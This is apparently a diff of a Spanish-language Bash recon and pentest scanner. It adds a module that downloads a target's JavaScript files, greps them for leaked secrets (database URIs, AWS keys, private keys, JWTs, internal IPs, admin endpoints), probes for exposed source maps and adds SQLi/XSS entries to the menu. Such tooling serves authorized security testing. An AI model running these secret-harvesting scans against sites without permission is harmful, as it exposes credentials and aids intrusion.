+        'mongodb://[^[:space:]<>]+'
+        'mysql://[^[:space:]<>]+'
+        '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
+        '192\.168\.[0-9]+\.[0-9]+'
+        '/api/v[0-9]/[a-zA-Z0-9/_-]+'
+        '/(admin|dashboard|config|debug|secret|private|backup)/'
+    )
+
+    local secrets_report=""
+    local endpoints_report=""
+    local analyzed=0
+
+    for js_url in "${all_js_urls[@]}"; do
+        [[ -z "$js_url" ]] && continue
+        local js_file_name
+        js_file_name=$(echo "$js_url" | sed 's|[/:?=&]|_|g' | tail -c 60)
+        local local_js="${js_dir}/${js_file_name}"
+
+        echo -e "  ${C_DIM}Analizando:${C_RST} ${C_CYN}${js_url}${C_RST}"
+
+        curl -skL --max-time 15 \
+            -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
+            "${js_url}" -o "${local_js}" 2>/dev/null
+
+        [[ ! -s "$local_js" ]] && continue
+        ((analyzed++)) || true
+
+        local file_size
+        file_size=$(du -sh "$local_js" 2>/dev/null | cut -f1)
+        echo -e "    ${C_DIM}Tamaño: ${file_size}${C_RST}"
+
+        # Buscar cada patrón (usando arrays paralelos)
+        local pat_idx=0
+        while [[ $pat_idx -lt ${#PAT_NAMES[@]} ]]; do
+            local pattern_name="${PAT_NAMES[$pat_idx]}"
+            local pattern="${PAT_REGEX[$pat_idx]}"
+            local matches
+            matches=$(grep -oiE "$pattern" "$local_js" 2>/dev/null | head -5 | tr '\n' ' ')
+
+            if [[ -n "$matches" ]]; then
+                echo -e "    ${C_RED}[!] ${pattern_name}:${C_RST} ${matches:0:100}..."
+                ((vuln_count++)) || true
+
+                local severity="ALTO"
+                [[ "$pattern_name" == *"AWS"* || "$pattern_name" == *"Private Key"* || "$pattern_name" == *"JWT"* ]] && severity="CRITICO"
+                [[ "$pattern_name" == *"Email"* || "$pattern_name" == *"Endpoint API"* ]] && severity="BAJO"
+                [[ "$pattern_name" == *"IP interna"* || "$pattern_name" == *"Endpoint interno"* ]] && severity="MEDIO"
+
+                secrets_report+="<tr><td>${severity}</td><td>${js_url}</td><td>${pattern_name}</td><td><code>${matches:0:150}</code></td></tr>"
+            fi
+            ((pat_idx++)) || true
+        done
+
+        # ── Extraer endpoints de la API del JS ──
+        local api_endpoints
+        api_endpoints=$(grep -oE "/[a-zA-Z0-9/_-]{3,80}" "$local_js" 2>/dev/null | \
+            grep -v "^//" | \
+            sort -u | head -50)
+
+        if [[ -n "$api_endpoints" ]]; then
+            endpoints_report+="<b>${js_url}</b><pre>${api_endpoints}</pre>"
+        fi
+
+        # Guardar versión legible (si es minificado, formatear básico)
+        # Guardar copia legible básica (sed beautify)
+        sed 's/;/;\n/g; s/{/{\n/g; s/}/\n}\n/g' "${local_js}" 2>/dev/null | head -c 500000 > "${local_js}.readable" 2>/dev/null || true
+    done
+
+    # ── PASO 3: Source Maps ──
+    echo
+    log "Paso 3/4: Buscando Source Maps (.map)..."
+    local sourcemap_count=0
+    for js_url in "${all_js_urls[@]}"; do
+        local map_url="${js_url}.map"
+        local map_status
+        map_status=$(curl -sko /dev/null --max-time 5 -w "%{http_code}" "${map_url}" 2>/dev/null)
+        if [[ "$map_status" == "200" ]]; then
+            warn "Source Map EXPUESTO: ${map_url}"
+            ((sourcemap_count++)) || true
+            add_finding "ALTO" "Source Map Expuesto Públicamente" \
+                "URL: <b>${map_url}</b><br>Los source maps revelan el código fuente original (incluso TypeScript/JSX sin compilar).<br><b>Herramienta:</b> <code>sourcemapper -url ${map_url} -output ./sourcecode</code>"
+        fi
+    done
+    [[ $sourcemap_count -eq 0 ]] && ok "No se encontraron source maps expuestos."
+
+    # ── PASO 4: Detectar frameworks JS ──
+    echo
+    log "Paso 4/4: Detectando framework JS..."
+    local framework="Desconocido"
+    local fw_detail=""
+
+    if [[ -n "$page_html" ]]; then
+        echo "$page_html" | grep -qi "react\|__REACT\|data-reactroot\|_react" && framework="React" && fw_detail="React detectado — busca /static/js/ para bundles"
+        echo "$page_html" | grep -qi "ng-version\|angular\|__ngContext__" && framework="Angular" && fw_detail="Angular detectado — revisa main.js y environment.ts en source maps"
+        echo "$page_html" | grep -qi "__vue\|v-app\|nuxt" && framework="Vue/Nuxt" && fw_detail="Vue detectado — busca api/ en Vuex store"
+        echo "$page_html" | grep -qi "next/\|__NEXT_DATA__\|_next/static" && framework="Next.js" && fw_detail="Next.js detectado — revisa /_next/static/chunks/ y /api/ routes"
+        echo "$page_html" | grep -qi "gatsby\|___gatsby" && framework="Gatsby" && fw_detail="Gatsby detectado — busca /page-data/app-data.json"
+        echo "$page_html" | grep -qi "svelte\|__svelte" && framework="Svelte" && fw_detail="Svelte detectado"
+        echo "$page_html" | grep -qi "ember\|Ember\." && framework="Ember.js" && fw_detail="Ember.js detectado"
+        echo "$page_html" | grep -qi "window\.wp\|wp-content\|wp-includes" && framework="WordPress+React" && fw_detail="WordPress con Gutenberg/React detectado — revisa wp-json API"
+    fi
+
+    if [[ "$framework" != "Desconocido" ]]; then
+        ok "Framework detectado: ${C_YEL}${framework}${C_RST}"
+        add_finding "INFO" "Framework JS Detectado: ${framework}" "${fw_detail}"
+    fi
+
+    # ── Reporte final ──
+    echo
+    ok "Archivos JS analizados: ${analyzed}"
+
+    if (( vuln_count > 0 )); then
+        add_finding "CRÍTICO" "Secretos/Datos Sensibles en JavaScript (${vuln_count} hallazgos)" \
+            "<table class='vuln-table'><tr><th>Severidad</th><th>Archivo JS</th><th>Tipo</th><th>Valor (truncado)</th></tr>${secrets_report}</table>"
+    else
+        ok "No se encontraron secretos obvios en los archivos JS analizados."
+        add_finding "INFO" "JS Analysis" "No se encontraron secrets/tokens hardcoded obvios en ${analyzed} archivos JS analizados."
+    fi
+
+    if [[ -n "$endpoints_report" ]]; then
+        add_finding "MEDIO" "Endpoints Extraídos de Archivos JS" \
+            "${endpoints_report}<br><b>Tip:</b> Prueba estos endpoints directamente con curl o Burp Suite."
+    fi
+
+    ok "Archivos JS descargados en: ${js_dir}/"
+    echo
+}
+
 # ─── REPORTE HTML PROFESIONAL ────────────────────────────────────
 generar_reporte_html() {
     log "Generando Reporte HTML Profesional..."
@@ -533,14 +1376,17 @@ generar_reporte_html() {
             *)         ((info_count++));     color="#5bc0de" ;;
         esac
 
-        findings_html+="
-        <div class='finding finding-$(echo $severity | tr '[:upper:]' '[:lower:]' | tr 'Á' 'a' | sed 's/ítico/itico/g' | sed 's/é/e/g' | sed 's/ó/o/g')'>
-            <div class='finding-header'>
-                <span class='badge' style='background:${color};'>${severity}</span>
-                <span class='finding-title'>${title}</span>
-            </div>
-            <div class='finding-detail'>${detail}</div>
-        </div>"
+        local sev_class
+        sev_class=$(echo "$severity" | tr '[:upper:]' '[:lower:]' | \
+            sed 's/ítico/itico/g; s/é/e/g; s/ó/o/g; s/ /_/g')
+        findings_html+="<div class='finding finding-${sev_class}'>"
+        findings_html+="<div class='finding-header'>"
+        findings_html+="<span class='badge' style='background:${color};'>${severity}</span>"
+        findings_html+="<span class='finding-title'>${title}</span>"
+        findings_html+="</div>"
+        findings_html+="<div class='finding-detail'>${detail}</div>"
+        findings_html+="</div>"
+
     done
 
     cat > "${REPORT_FILE}" << HTMLEOF
@@ -589,6 +1435,17 @@ generar_reporte_html() {
         .file-item a:hover { text-decoration: underline; }
         
         .footer { text-align: center; padding: 20px; color: #484f58; font-size: 12px; margin-top: 40px; border-top: 1px solid #21262d; }
+        
+        /* Vuln Tables */
+        .vuln-table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 10px; }
+        .vuln-table th { background: #21262d; color: #8b949e; padding: 8px 10px; text-align: left; border: 1px solid #30363d; }
+        .vuln-table td { padding: 7px 10px; border: 1px solid #21262d; vertical-align: top; word-break: break-all; }
+        .vuln-table tr:hover td { background: #161b22; }
+        td.critical, td.crítico { color: #ff2d2d; font-weight: bold; }
+        td.high, td.alto { color: #ff6b35; font-weight: bold; }
+        td.medium, td.medio { color: #ffd23f; font-weight: bold; }
+        td.low, td.bajo { color: #57cc99; }
+        td.vuln { color: #ff6b35; font-weight: bold; }
         
         /* Collapse toggle */
         .finding-detail { display: block; }
@@ -649,9 +1506,10 @@ menu_modulos() {
     echo -e "  ${C_GRN}[3]${C_RST} Web-Only (headers, nikto, gobuster, whatweb)"
     echo -e "  ${C_GRN}[4]${C_RST} Bug Bounty Pack (recon + web + subdominios)"
     echo -e "  ${C_GRN}[5]${C_RST} Vuln Scan + Searchsploit"
-    echo -e "  ${C_GRN}[6]${C_RST} Custom (elegir módulos)"
+    echo -e "  ${C_GRN}[6]${C_RST} Injection Pack (SQLi + XSS + Endpoints + JS)"
+    echo -e "  ${C_GRN}[7]${C_RST} Custom (elegir módulos)"
     echo
-    echo -ne "${C_YEL}Opción [1-6]: ${C_RST}"
+    echo -ne "${C_YEL}Opción [1-7]: ${C_RST}"
     read -r opcion
 
     case "$opcion" in
@@ -660,18 +1518,19 @@ menu_modulos() {
         3) modulo_waf; modulo_http_headers; modulo_whatweb; modulo_nikto; modulo_gobuster ;;
         4) modulo_ttl_os; modulo_port_scan; modulo_version_scan; modulo_waf; modulo_http_headers; modulo_whatweb; modulo_nikto; modulo_gobuster; modulo_subdominios ;;
         5) modulo_port_scan; modulo_version_scan; modulo_vuln_scan; modulo_searchsploit ;;
-        6) menu_custom ;;
+        6) modulo_waf; modulo_http_headers; modulo_sqli; modulo_xss; modulo_endpoints; modulo_js_analysis ;;
+        7) menu_custom ;;
         *) warn "Opción inválida. Ejecutando Full Scan."; run_full_scan ;;
     esac
 }
 
 menu_custom() {
-    local modulos=("ttl" "ports" "version" "waf" "headers" "whatweb" "nikto" "gobuster" "subdominios" "smb" "vulns" "searchsploit")
     echo
     echo -e "Módulos disponibles (escribe los números separados por espacio):"
-    echo -e "  1) TTL/OS    2) Port Scan   3) Version Scan  4) WAF"
-    echo -e "  5) HTTP Headers  6) WhatWeb  7) Nikto  8) Gobuster"
-    echo -e "  9) Subdominios  10) SMB   11) Vuln Scan  12) Searchsploit"
+    echo -e "  1) TTL/OS      2) Port Scan    3) Version Scan   4) WAF"
+    echo -e "  5) HTTP Headers  6) WhatWeb    7) Nikto          8) Gobuster"
+    echo -e "  9) Subdominios  10) SMB        11) Vuln Scan    12) Searchsploit"
+    echo -e " 13) SQLi         14) XSS        15) Endpoints    16) JS Analysis"
     echo
     echo -ne "${C_YEL}Selección: ${C_RST}"
     read -r seleccion
@@ -690,6 +1549,10 @@ menu_custom() {
             10) modulo_smb ;;
             11) modulo_vuln_scan ;;
             12) modulo_searchsploit ;;
+            13) modulo_sqli ;;
+            14) modulo_xss ;;
+            15) modulo_endpoints ;;
+            16) modulo_js_analysis ;;
         esac
     done
 }
@@ -707,6 +1570,10 @@ run_full_scan() {
     modulo_smb
     modulo_vuln_scan
     modulo_searchsploit
+    modulo_sqli
+    modulo_xss
+    modulo_endpoints
+    modulo_js_analysis
 }
 
 # ─── HELP ───────────────────────────────────────────────────────
